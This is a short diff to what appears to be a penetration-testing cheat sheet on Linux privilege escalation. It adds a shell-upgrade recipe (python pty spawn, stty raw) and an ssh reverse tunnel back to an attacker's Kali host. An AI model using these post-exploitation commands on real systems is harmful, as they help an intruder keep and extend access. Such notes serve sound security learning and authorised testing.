@@ -21,6 +21,22 @@ git clone https://github.com/pentestmonkey/unix-privesc-check.git
 ./unix-privesc-check standard > output.txt
 ```
 
+## Upgrade shell
+
+``` bash
+/usr/bin/python -c "import pty; pty.spawn('/bin/sh')"
+export TERM=xterm
+
+stty raw -echo
+fg
+```
+
+## <a href='https://www.ssh.com/ssh/tunneling/example' target="blank">Port Tunneling</a>
+
+``` bash
+ssh -R $myip:8080:127.0.0.1:8080 kali@$myip
+```
+
 ## Information Gathering
 
 ### What's the OS? What version? What architecture?
